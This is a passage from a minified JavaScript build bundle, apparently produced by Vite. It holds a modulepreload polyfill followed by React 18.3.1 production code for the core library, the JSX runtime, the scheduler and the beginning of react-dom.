(function() {
    const t = document.createElement("link").relList;
    if (t && t.supports && t.supports("modulepreload"))
        return;
    for (const l of document.querySelectorAll('link[rel="modulepreload"]'))
        r(l);
    new MutationObserver(l => {
        for (const i of l)
            if (i.type === "childList")
                for (const o of i.addedNodes)
                    o.tagName === "LINK" && o.rel === "modulepreload" && r(o)
    }
    ).observe(document, {
        childList: !0,
        subtree: !0
    });
    function n(l) {
        const i = {};
        return l.integrity && (i.integrity = l.integrity),
        l.referrerPolicy && (i.referrerPolicy = l.referrerPolicy),
        l.crossOrigin === "use-credentials" ? i.credentials = "include" : l.crossOrigin === "anonymous" ? i.credentials = "omit" : i.credentials = "same-origin",
        i
    }
    function r(l) {
        if (l.ep)
            return;
        l.ep = !0;
        const i = n(l);
        fetch(l.href, i)
    }
}
)();
function uc(e) {
    return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e
}
var Ju = {
    exports: {}
}
  , rl = {}
  , Ku = {
    exports: {}
}
  , R = {};
/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var Qn = Symbol.for("react.element")
  , sc = Symbol.for("react.portal")
  , ac = Symbol.for("react.fragment")
  , cc = Symbol.for("react.strict_mode")
  , dc = Symbol.for("react.profiler")
  , fc = Symbol.for("react.provider")
  , pc = Symbol.for("react.context")
  , mc = Symbol.for("react.forward_ref")
  , hc = Symbol.for("react.suspense")
  , yc = Symbol.for("react.memo")
  , vc = Symbol.for("react.lazy")
  , Io = Symbol.iterator;
function gc(e) {
    return e === null || typeof e != "object" ? null : (e = Io && e[Io] || e["@@iterator"],
    typeof e == "function" ? e : null)
}
var Qu = {
    isMounted: function() {
        return !1
    },
    enqueueForceUpdate: function() {},
    enqueueReplaceState: function() {},
    enqueueSetState: function() {}
}
  , Au = Object.assign
  , $u = {};
function on(e, t, n) {
    this.props = e,
    this.context = t,
    this.refs = $u,
    this.updater = n || Qu
}
on.prototype.isReactComponent = {};
on.prototype.setState = function(e, t) {
    if (typeof e != "object" && typeof e != "function" && e != null)
        throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
    this.updater.enqueueSetState(this, e, t, "setState")
}
;
on.prototype.forceUpdate = function(e) {
    this.updater.enqueueForceUpdate(this, e, "forceUpdate")
}
;
function bu() {}
bu.prototype = on.prototype;
function Oi(e, t, n) {
    this.props = e,
    this.context = t,
    this.refs = $u,
    this.updater = n || Qu
}
var Xi = Oi.prototype = new bu;
Xi.constructor = Oi;
Au(Xi, on.prototype);
Xi.isPureReactComponent = !0;
var Fo = Array.isArray
  , qu = Object.prototype.hasOwnProperty
  , Yi = {
    current: null
}
  , es = {
    key: !0,
    ref: !0,
    __self: !0,
    __source: !0
};
function ts(e, t, n) {
    var r, l = {}, i = null, o = null;
    if (t != null)
        for (r in t.ref !== void 0 && (o = t.ref),
        t.key !== void 0 && (i = "" + t.key),
        t)
            qu.call(t, r) && !es.hasOwnProperty(r) && (l[r] = t[r]);
    var u = arguments.length - 2;
    if (u === 1)
        l.children = n;
    else if (1 < u) {
        for (var s = Array(u), d = 0; d < u; d++)
            s[d] = arguments[d + 2];
        l.children = s
    }
    if (e && e.defaultProps)
        for (r in u = e.defaultProps,
        u)
            l[r] === void 0 && (l[r] = u[r]);
    return {
        $$typeof: Qn,
        type: e,
        key: i,
        ref: o,
        props: l,
        _owner: Yi.current
    }
}
function xc(e, t) {
    return {
        $$typeof: Qn,
        type: e.type,
        key: t,
        ref: e.ref,
        props: e.props,
        _owner: e._owner
    }
}
function Ui(e) {
    return typeof e == "object" && e !== null && e.$$typeof === Qn
}
function kc(e) {
    var t = {
        "=": "=0",
        ":": "=2"
    };
    return "$" + e.replace(/[=:]/g, function(n) {
        return t[n]
    })
}
var Go = /\/+/g;
function Sl(e, t) {
    return typeof e == "object" && e !== null && e.key != null ? kc("" + e.key) : t.toString(36)
}
function wr(e, t, n, r, l) {
    var i = typeof e;
    (i === "undefined" || i === "boolean") && (e = null);
    var o = !1;
    if (e === null)
        o = !0;
    else
        switch (i) {
        case "string":
        case "number":
            o = !0;
            break;
        case "object":
            switch (e.$$typeof) {
            case Qn:
            case sc:
                o = !0
            }
        }
    if (o)
        return o = e,
        l = l(o),
        e = r === "" ? "." + Sl(o, 0) : r,
        Fo(l) ? (n = "",
        e != null && (n = e.replace(Go, "$&/") + "/"),
        wr(l, t, n, "", function(d) {
            return d
        })) : l != null && (Ui(l) && (l = xc(l, n + (!l.key || o && o.key === l.key ? "" : ("" + l.key).replace(Go, "$&/") + "/") + e)),
        t.push(l)),
        1;
    if (o = 0,
    r = r === "" ? "." : r + ":",
    Fo(e))
        for (var u = 0; u < e.length; u++) {
            i = e[u];
            var s = r + Sl(i, u);
            o += wr(i, t, n, s, l)
        }
    else if (s = gc(e),
    typeof s == "function")
        for (e = s.call(e),
        u = 0; !(i = e.next()).done; )
            i = i.value,
            s = r + Sl(i, u++),
            o += wr(i, t, n, s, l);
    else if (i === "object")
        throw t = String(e),
        Error("Objects are not valid as a React child (found: " + (t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.");
    return o
}
function nr(e, t, n) {
    if (e == null)
        return e;
    var r = []
      , l = 0;
    return wr(e, r, "", "", function(i) {
        return t.call(n, i, l++)
    }),
    r
}
function wc(e) {
    if (e._status === -1) {
        var t = e._result;
        t = t(),
        t.then(function(n) {
            (e._status === 0 || e._status === -1) && (e._status = 1,
            e._result = n)
        }, function(n) {
            (e._status === 0 || e._status === -1) && (e._status = 2,
            e._result = n)
        }),
        e._status === -1 && (e._status = 0,
        e._result = t)
    }
    if (e._status === 1)
        return e._result.default;
    throw e._result
}
var ue = {
    current: null
}
  , Sr = {
    transition: null
}
  , Sc = {
    ReactCurrentDispatcher: ue,
    ReactCurrentBatchConfig: Sr,
    ReactCurrentOwner: Yi
};
function ns() {
    throw Error("act(...) is not supported in production builds of React.")
}
R.Children = {
    map: nr,
    forEach: function(e, t, n) {
        nr(e, function() {
            t.apply(this, arguments)
        }, n)
    },
    count: function(e) {
        var t = 0;
        return nr(e, function() {
            t++
        }),
        t
    },
    toArray: function(e) {
        return nr(e, function(t) {
            return t
        }) || []
    },
    only: function(e) {
        if (!Ui(e))
            throw Error("React.Children.only expected to receive a single React element child.");
        return e
    }
};
R.Component = on;
R.Fragment = ac;
R.Profiler = dc;
R.PureComponent = Oi;
R.StrictMode = cc;
R.Suspense = hc;
R.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = Sc;
R.act = ns;
R.cloneElement = function(e, t, n) {
    if (e == null)
        throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
    var r = Au({}, e.props)
      , l = e.key
      , i = e.ref
      , o = e._owner;
    if (t != null) {
        if (t.ref !== void 0 && (i = t.ref,
        o = Yi.current),
        t.key !== void 0 && (l = "" + t.key),
        e.type && e.type.defaultProps)
            var u = e.type.defaultProps;
        for (s in t)
            qu.call(t, s) && !es.hasOwnProperty(s) && (r[s] = t[s] === void 0 && u !== void 0 ? u[s] : t[s])
    }
    var s = arguments.length - 2;
    if (s === 1)
        r.children = n;
    else if (1 < s) {
        u = Array(s);
        for (var d = 0; d < s; d++)
            u[d] = arguments[d + 2];
        r.children = u
    }
    return {
        $$typeof: Qn,
        type: e.type,
        key: l,
        ref: i,
        props: r,
        _owner: o
    }
}
;
R.createContext = function(e) {
    return e = {
        $$typeof: pc,
        _currentValue: e,
        _currentValue2: e,
        _threadCount: 0,
        Provider: null,
        Consumer: null,
        _defaultValue: null,
        _globalName: null
    },
    e.Provider = {
        $$typeof: fc,
        _context: e
    },
    e.Consumer = e
}
;
R.createElement = ts;
R.createFactory = function(e) {
    var t = ts.bind(null, e);
    return t.type = e,
    t
}
;
R.createRef = function() {
    return {
        current: null
    }
}
;
R.forwardRef = function(e) {
    return {
        $$typeof: mc,
        render: e
    }
}
;
R.isValidElement = Ui;
R.lazy = function(e) {
    return {
        $$typeof: vc,
        _payload: {
            _status: -1,
            _result: e
        },
        _init: wc
    }
}
;
R.memo = function(e, t) {
    return {
        $$typeof: yc,
        type: e,
        compare: t === void 0 ? null : t
    }
}
;
R.startTransition = function(e) {
    var t = Sr.transition;
    Sr.transition = {};
    try {
        e()
    } finally {
        Sr.transition = t
    }
}
;
R.unstable_act = ns;
R.useCallback = function(e, t) {
    return ue.current.useCallback(e, t)
}
;
R.useContext = function(e) {
    return ue.current.useContext(e)
}
;
R.useDebugValue = function() {}
;
R.useDeferredValue = function(e) {
    return ue.current.useDeferredValue(e)
}
;
R.useEffect = function(e, t) {
    return ue.current.useEffect(e, t)
}
;
R.useId = function() {
    return ue.current.useId()
}
;
R.useImperativeHandle = function(e, t, n) {
    return ue.current.useImperativeHandle(e, t, n)
}
;
R.useInsertionEffect = function(e, t) {
    return ue.current.useInsertionEffect(e, t)
}
;
R.useLayoutEffect = function(e, t) {
    return ue.current.useLayoutEffect(e, t)
}
;
R.useMemo = function(e, t) {
    return ue.current.useMemo(e, t)
}
;
R.useReducer = function(e, t, n) {
    return ue.current.useReducer(e, t, n)
}
;
R.useRef = function(e) {
    return ue.current.useRef(e)
}
;
R.useState = function(e) {
    return ue.current.useState(e)
}
;
R.useSyncExternalStore = function(e, t, n) {
    return ue.current.useSyncExternalStore(e, t, n)
}
;
R.useTransition = function() {
    return ue.current.useTransition()
}
;
R.version = "18.3.1";
Ku.exports = R;
var Ge = Ku.exports;
const Nc = uc(Ge);
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var Cc = Ge
  , jc = Symbol.for("react.element")
  , Ec = Symbol.for("react.fragment")
  , Zc = Object.prototype.hasOwnProperty
  , zc = Cc.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner
  , Tc = {
    key: !0,
    ref: !0,
    __self: !0,
    __source: !0
};
function rs(e, t, n) {
    var r, l = {}, i = null, o = null;
    n !== void 0 && (i = "" + n),
    t.key !== void 0 && (i = "" + t.key),
    t.ref !== void 0 && (o = t.ref);
    for (r in t)
        Zc.call(t, r) && !Tc.hasOwnProperty(r) && (l[r] = t[r]);
    if (e && e.defaultProps)
        for (r in t = e.defaultProps,
        t)
            l[r] === void 0 && (l[r] = t[r]);
    return {
        $$typeof: jc,
        type: e,
        key: i,
        ref: o,
        props: l,
        _owner: zc.current
    }
}
rl.Fragment = Ec;
rl.jsx = rs;
rl.jsxs = rs;
Ju.exports = rl;
var c = Ju.exports
  , ls = {
    exports: {}
}
  , ge = {}
  , is = {
    exports: {}
}
  , os = {};
/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
(function(e) {
    function t(C, z) {
        var T = C.length;
        C.push(z);
        e: for (; 0 < T; ) {
            var D = T - 1 >>> 1
              , Q = C[D];
            if (0 < l(Q, z))
                C[D] = z,
                C[T] = Q,
                T = D;
            else
                break e
        }
    }
    function n(C) {
        return C.length === 0 ? null : C[0]
    }
    function r(C) {
        if (C.length === 0)
            return null;
        var z = C[0]
          , T = C.pop();
        if (T !== z) {
            C[0] = T;
            e: for (var D = 0, Q = C.length, er = Q >>> 1; D < er; ) {
                var vt = 2 * (D + 1) - 1
                  , wl = C[vt]
                  , gt = vt + 1
                  , tr = C[gt];
                if (0 > l(wl, T))
                    gt < Q && 0 > l(tr, wl) ? (C[D] = tr,
                    C[gt] = T,
                    D = gt) : (C[D] = wl,
                    C[vt] = T,
                    D = vt);
                else if (gt < Q && 0 > l(tr, T))
                    C[D] = tr,
                    C[gt] = T,
                    D = gt;
                else
                    break e
            }
        }
        return z
    }
    function l(C, z) {
        var T = C.sortIndex - z.sortIndex;
        return T !== 0 ? T : C.id - z.id
    }
    if (typeof performance == "object" && typeof performance.now == "function") {
        var i = performance;
        e.unstable_now = function() {
            return i.now()
        }
    } else {
        var o = Date
          , u = o.now();
        e.unstable_now = function() {
            return o.now() - u
        }
    }
    var s = []
      , d = []
      , y = 1
      , h = null
      , m = 3
      , x = !1
      , k = !1
      , w = !1
      , F = typeof setTimeout == "function" ? setTimeout : null
      , f = typeof clearTimeout == "function" ? clearTimeout : null
      , a = typeof setImmediate < "u" ? setImmediate : null;
    typeof navigator < "u" && navigator.scheduling !== void 0 && navigator.scheduling.isInputPending !== void 0 && navigator.scheduling.isInputPending.bind(navigator.scheduling);
    function p(C) {
        for (var z = n(d); z !== null; ) {
            if (z.callback === null)
                r(d);
            else if (z.startTime <= C)
                r(d),
                z.sortIndex = z.expirationTime,
                t(s, z);
            else
                break;
            z = n(d)
        }
    }
    function v(C) {
        if (w = !1,
        p(C),
        !k)
            if (n(s) !== null)
                k = !0,
                xl(N);
            else {
                var z = n(d);
                z !== null && kl(v, z.startTime - C)
            }
    }
    function N(C, z) {
        k = !1,
        w && (w = !1,
        f(Z),
        Z = -1),
        x = !0;
        var T = m;
        try {
            for (p(z),
            h = n(s); h !== null && (!(h.expirationTime > z) || C && !Ze()); ) {
                var D = h.callback;
                if (typeof D == "function") {
                    h.callback = null,
                    m = h.priorityLevel;
                    var Q = D(h.expirationTime <= z);
                    z = e.unstable_now(),
                    typeof Q == "function" ? h.callback = Q : h === n(s) && r(s),
                    p(z)
                } else
                    r(s);
                h = n(s)
            }
            if (h !== null)
                var er = !0;
            else {
                var vt = n(d);
                vt !== null && kl(v, vt.startTime - z),
                er = !1
            }
            return er
        } finally {
            h = null,
            m = T,
            x = !1
        }
    }
    var j = !1
      , E = null
      , Z = -1
      , U = 5
      , _ = -1;
    function Ze() {
        return !(e.unstable_now() - _ < U)
    }
    function an() {
        if (E !== null) {
            var C = e.unstable_now();
            _ = C;
            var z = !0;
            try {
                z = E(!0, C)
            } finally {
                z ? cn() : (j = !1,
                E = null)
            }
        } else
            j = !1
    }
    var cn;
    if (typeof a == "function")
        cn = function() {
            a(an)
        }
        ;
    else if (typeof MessageChannel < "u") {
        var Wo = new MessageChannel
          , oc = Wo.port2;
        Wo.port1.onmessage = an,
        cn = function() {
            oc.postMessage(null)
        }
    } else
        cn = function() {
            F(an, 0)
        }
        ;
    function xl(C) {
        E = C,
        j || (j = !0,
        cn())
    }
    function kl(C, z) {
        Z = F(function() {
            C(e.unstable_now())
        }, z)
    }
    e.unstable_IdlePriority = 5,
    e.unstable_ImmediatePriority = 1,
    e.unstable_LowPriority = 4,
    e.unstable_NormalPriority = 3,
    e.unstable_Profiling = null,
    e.unstable_UserBlockingPriority = 2,
    e.unstable_cancelCallback = function(C) {
        C.callback = null
    }
    ,
    e.unstable_continueExecution = function() {
        k || x || (k = !0,
        xl(N))
    }
    ,
    e.unstable_forceFrameRate = function(C) {
        0 > C || 125 < C ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : U = 0 < C ? Math.floor(1e3 / C) : 5
    }
    ,
    e.unstable_getCurrentPriorityLevel = function() {
        return m
    }
    ,
    e.unstable_getFirstCallbackNode = function() {
        return n(s)
    }
    ,
    e.unstable_next = function(C) {
        switch (m) {
        case 1:
        case 2:
        case 3:
            var z = 3;
            break;
        default:
            z = m
        }
        var T = m;
        m = z;
        try {
            return C()
        } finally {
            m = T
        }
    }
    ,
    e.unstable_pauseExecution = function() {}
    ,
    e.unstable_requestPaint = function() {}
    ,
    e.unstable_runWithPriority = function(C, z) {
        switch (C) {
        case 1:
        case 2:
        case 3:
        case 4:
        case 5:
            break;
        default:
            C = 3
        }
        var T = m;
        m = C;
        try {
            return z()
        } finally {
            m = T
        }
    }
    ,
    e.unstable_scheduleCallback = function(C, z, T) {
        var D = e.unstable_now();
        switch (typeof T == "object" && T !== null ? (T = T.delay,
        T = typeof T == "number" && 0 < T ? D + T : D) : T = D,
        C) {
        case 1:
            var Q = -1;
            break;
        case 2:
            Q = 250;
            break;
        case 5:
            Q = 1073741823;
            break;
        case 4:
            Q = 1e4;
            break;
        default:
            Q = 5e3
        }
        return Q = T + Q,
        C = {
            id: y++,
            callback: z,
            priorityLevel: C,
            startTime: T,
            expirationTime: Q,
            sortIndex: -1
        },
        T > D ? (C.sortIndex = T,
        t(d, C),
        n(s) === null && C === n(d) && (w ? (f(Z),
        Z = -1) : w = !0,
        kl(v, T - D))) : (C.sortIndex = Q,
        t(s, C),
        k || x || (k = !0,
        xl(N))),
        C
    }
    ,
    e.unstable_shouldYield = Ze,
    e.unstable_wrapCallback = function(C) {
        var z = m;
        return function() {
            var T = m;
            m = z;
            try {
                return C.apply(this, arguments)
            } finally {
                m = T
            }
        }
    }
}
)(os);
is.exports = os;
var Rc = is.exports;
/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var _c = Ge
  , ve = Rc;
function g(e) {
    for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++)
        t += "&args[]=" + encodeURIComponent(arguments[n]);
    return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
}
var us = new Set
  , Pn = {};
function _t(e, t) {
    bt(e, t),
    bt(e + "Capture", t)
}
function bt(e, t) {
    for (Pn[e] = t,
    e = 0; e < t.length; e++)
        us.add(t[e])
}
var He = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u")
  , Kl = Object.prototype.hasOwnProperty
  , Pc = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/
  , Mo = {}
  , Oo = {};
function Lc(e) {
    return Kl.call(Oo, e) ? !0 : Kl.call(Mo, e) ? !1 : Pc.test(e) ? Oo[e] = !0 : (Mo[e] = !0,
    !1)
}
function Vc(e, t, n, r) {
    if (n !== null && n.type === 0)
        return !1;
    switch (typeof t) {
    case "function":
    case "symbol":
        return !0;
    case "boolean":
        return r ? !1 : n !== null ? !n.acceptsBooleans : (e = e.toLowerCase().slice(0, 5),
        e !== "data-" && e !== "aria-");
    default:
        return !1
    }
}
function Wc(e, t, n, r) {
    if (t === null || typeof t > "u" || Vc(e, t, n, r))
        return !0;
    if (r)
        return !1;
    if (n !== null)
        switch (n.type) {
        case 3:
            return !t;
        case 4:
            return t === !1;
        case 5:
            return isNaN(t);
        case 6:
            return isNaN(t) || 1 > t
        }
    return !1
}
function se(e, t, n, r, l, i, o) {
    this.acceptsBooleans = t === 2 || t === 3 || t === 4,
    this.attributeName = r,
    this.attributeNamespace = l,
    this.mustUseProperty = n,
    this.propertyName = e,
    this.type = t,
    this.sanitizeURL = i,
    this.removeEmptyString = o
}
var ee = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e) {
    ee[e] = new se(e,0,!1,e,null,!1,!1)
});
[["acceptCharset", "accept-charset"], ["className", "class"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"]].forEach(function(e) {
    var t = e[0];
    ee[t] = new se(t,1,!1,e[1],null,!1,!1)
});
["contentEditable", "draggable", "spellCheck", "value"].forEach(function(e) {
    ee[e] = new se(e,2,!1,e.toLowerCase(),null,!1,!1)
});
["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function(e) {
    ee[e] = new se(e,2,!1,e,null,!1,!1)
});
"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e) {
    ee[e] = new se(e,3,!1,e.toLowerCase(),null,!1,!1)
});
["checked", "multiple", "muted", "selected"].forEach(function(e) {
    ee[e] = new se(e,3,!0,e,null,!1,!1)
});
["capture", "download"].forEach(function(e) {
    ee[e] = new se(e,4,!1,e,null,!1,!1)
});
["cols", "rows", "size", "span"].forEach(function(e) {
    ee[e] = new se(e,6,!1,e,null,!1,!1)
});
["rowSpan", "start"].forEach(function(e) {
    ee[e] = new se(e,5,!1,e.toLowerCase(),null,!1,!1)
});
var Di = /[\-:]([a-z])/g;
function Bi(e) {
    return e[1].toUpperCase()
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e) {
    var t = e.replace(Di, Bi);
    ee[t] = new se(t,1,!1,e,null,!1,!1)
});
"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e) {
    var t = e.replace(Di, Bi);
    ee[t] = new se(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)
});
["xml:base", "xml:lang", "xml:space"].forEach(function(e) {
    var t = e.replace(Di, Bi);
    ee[t] = new se(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)
});
["tabIndex", "crossOrigin"].forEach(function(e) {
    ee[e] = new se(e,1,!1,e.toLowerCase(),null,!1,!1)
});
ee.xlinkHref = new se("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);
["src", "href", "action", "formAction"].forEach(function(e) {
    ee[e] = new se(e,1,!1,e.toLowerCase(),null,!0,!0)
});
function Hi(e, t, n, r) {
    var l = ee.hasOwnProperty(t) ? ee[t] : null;
    (l !== null ? l.type !== 0 : r || !(2 < t.length) || t[0] !== "o" && t[0] !== "O" || t[1] !== "n" && t[1] !== "N") && (Wc(t, n, l, r) && (n = null),
    r || l === null ? Lc(t) && (n === null ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : l.mustUseProperty ? e[l.propertyName] = n === null ? l.type === 3 ? !1 : "" : n : (t = l.attributeName,
    r = l.attributeNamespace,
    n === null ? e.removeAttribute(t) : (l = l.type,
    n = l === 3 || l === 4 && n === !0 ? "" : "" + n,
    r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))))
}
var Ae = _c.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED
  , rr = Symbol.for("react.element")
  , Vt = Symbol.for("react.portal")
  , Wt = Symbol.for("react.fragment")
  , Ji = Symbol.for("react.strict_mode")
  , Ql = Symbol.for("react.profiler")
  , ss = Symbol.for("react.provider")
  , as = Symbol.for("react.context")
  , Ki = Symbol.for("react.forward_ref")
  , Al = Symbol.for("react.suspense")
  , $l = Symbol.for("react.suspense_list")
  , Qi = Symbol.for("react.memo")
  , be = Symbol.for("react.lazy")
  , cs = Symbol.for("react.offscreen")
  , Xo = Symbol.iterator;
function dn(e) {
    return e === null || typeof e != "object" ? null : (e = Xo && e[Xo] || e["@@iterator"],
    typeof e == "function" ? e : null)
}
var X = Object.assign, Nl;
function xn(e) {
    if (Nl === void 0)
        try {
            throw Error()
        } catch (n) {
            var t = n.stack.trim().match(/\n( *(at )?)/);
            Nl = t && t[1] || ""
        }
    return `
` + Nl + e
}
var Cl = !1;
function jl(e, t) {
    if (!e || Cl)
        return "";
    Cl = !0;
    var n = Error.prepareStackTrace;
    Error.prepareStackTrace = void 0;
    try {
        if (t)
            if (t = function() {
                throw Error()
            }
            ,
            Object.defineProperty(t.prototype, "props", {
                set: function() {
                    throw Error()
                }
            }),
            typeof Reflect == "object" && Reflect.construct) {
                try {
                    Reflect.construct(t, [])
                } catch (d) {
                    var r = d
                }
                Reflect.construct(e, [], t)
            } else {
                try {
                    t.call()
                } catch (d) {
                    r = d
                }
                e.call(t.prototype)
            }
        else {
            try {
                throw Error()
            } catch (d) {
                r = d
            }
            e()
        }
    } catch (d) {
        if (d && r && typeof d.stack == "string") {
            for (var l = d.stack.split(`
`), i = r.stack.split(`
`), o = l.length - 1, u = i.length - 1; 1 <= o && 0 <= u && l[o] !== i[u]; )
                u--;
            for (; 1 <= o && 0 <= u; o--,
            u--)
                if (l[o] !== i[u]) {
                    if (o !== 1 || u !== 1)
                        do
                            if (o--,
                            u--,
                            0 > u || l[o] !== i[u]) {
                                var s = `
` + l[o].replace(" at new ", " at ");
                                return e.displayName && s.includes("<anonymous>") && (s = s.replace("<anonymous>", e.displayName)),
                                s
                            }
                        while (1 <= o && 0 <= u);
                    break
                }
        }
    } finally {
        Cl = !1,
        Error.prepareStackTrace = n
    }
    return (e = e ? e.displayName || e.name : "") ? xn(e) : ""
}
function Ic(e) {
    switch (e.tag) {
    case 5:
        return xn(e.type);
    case 16:
        return xn("Lazy");
    case 13:
        return xn("Suspense");
    case 19:
        return xn("SuspenseList");
    case 0:
    case 2:
    case 15:
        return e = jl(e.type, !1),
        e;
    case 11:
        return e = jl(e.type.render, !1),
        e;
    case 1:
        return e = jl(e.type, !0),
        e;
    default:
        return ""
    }
}
function bl(e) {
    if (e == null)
        return null;
    if (typeof e == "function")
        return e.displayName || e.name || null;
    if (typeof e == "string")
        return e;
    switch (e) {
    case Wt:
        return "Fragment";
    case Vt:
        return "Portal";
    case Ql:
        return "Profiler";
    case Ji:
        return "StrictMode";
    case Al:
        return "Suspense";
    case $l:
        return "SuspenseList"
    }
    if (typeof e == "object")
        switch (e.$$typeof) {
        case as:
            return (e.displayName || "Context") + ".Consumer";
        case ss:
            return (e._context.displayName || "Context") + ".Provider";
        case Ki:
            var t = e.render;
            return e = e.displayName,
            e || (e = t.displayName || t.name || "",
            e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef"),
            e;
        case Qi:
            return t = e.displayName || null,
            t !== null ? t : bl(e.type) || "Memo";
        case be:
            t = e._payload,
            e = e._init;
            try {
                return bl(e(t))
            } catch {}
        }
    return null
}
function Fc(e) {
    var t = e.type;
    switch (e.tag) {
    case 24:
        return "Cache";
    case 9:
        return (t.displayName || "Context") + ".Consumer";
    case 10:
        return (t._context.displayName || "Context") + ".Provider";
    case 18:
        return "DehydratedFragment";
    case 11:
        return e = t.render,
        e = e.displayName || e.name || "",
        t.displayName || (e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef");
    case 7:
        return "Fragment";
    case 5:
        return t;
    case 4:
        return "Portal";
    case 3:
        return "Root";
    case 6:
        return "Text";
    case 16:
        return bl(t);
    case 8:
        return t === Ji ? "StrictMode" : "Mode";
    case 22:
        return "Offscreen";
    case 12:
        return "Profiler";
    case 21:
        return "Scope";
    case 13:
        return "Suspense";
    case 19:
        return "SuspenseList";
    case 25:
        return "TracingMarker";
    case 1:
    case 0:
    case 17:
    case 2:
    case 14:
    case 15:
        if (typeof t == "function")
            return t.displayName || t.name || null;
        if (typeof t == "string")
            return t
    }
    return null
}
function ft(e) {
    switch (typeof e) {
    case "boolean":
    case "number":
    case "string":
    case "undefined":
        return e;
    case "object":
        return e;
    default:
        return ""
    }
}
function ds(e) {
    var t = e.type;
    return (e = e.nodeName) && e.toLowerCase() === "input" && (t === "checkbox" || t === "radio")
}
function Gc(e) {
    var t = ds(e) ? "checked" : "value"
      , n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t)
      , r = "" + e[t];
    if (!e.hasOwnProperty(t) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
        var l = n.get
          , i = n.set;
        return Object.defineProperty(e, t, {
            configurable: !0,
            get: function() {
                return l.call(this)
            },
            set: function(o) {
                r = "" + o,
                i.call(this, o)
            }
        }),
        Object.defineProperty(e, t, {
            enumerable: n.enumerable
        }),
        {
            getValue: function() {
                return r
            },
            setValue: function(o) {
                r = "" + o
            },
            stopTracking: function() {
                e._valueTracker = null,
                delete e[t]
            }
        }
    }
}
function lr(e) {
    e._valueTracker || (e._valueTracker = Gc(e))
}
function fs(e) {
    if (!e)
        return !1;
    var t = e._valueTracker;
    if (!t)
        return !0;
    var n = t.getValue()
      , r = "";
    return e && (r = ds(e) ? e.checked ? "true" : "false" : e.value),
    e = r,
    e !== n ? (t.setValue(e),
    !0) : !1
}
function Lr(e) {
    if (e = e || (typeof document < "u" ? document : void 0),
    typeof e > "u")
        return null;
    try {
        return e.activeElement || e.body
    } catch {
        return e.body
    }
}
function ql(e, t) {
    var n = t.checked;
    return X({}, t, {
        defaultChecked: void 0,
        defaultValue: void 0,
        value: void 0,
        checked: n ?? e._wrapperState.initialChecked
    })
}
function Yo(e, t) {
    var n = t.defaultValue == null ? "" : t.defaultValue
      , r = t.checked != null ? t.checked : t.defaultChecked;
    n = ft(t.value != null ? t.value : n),
    e._wrapperState = {
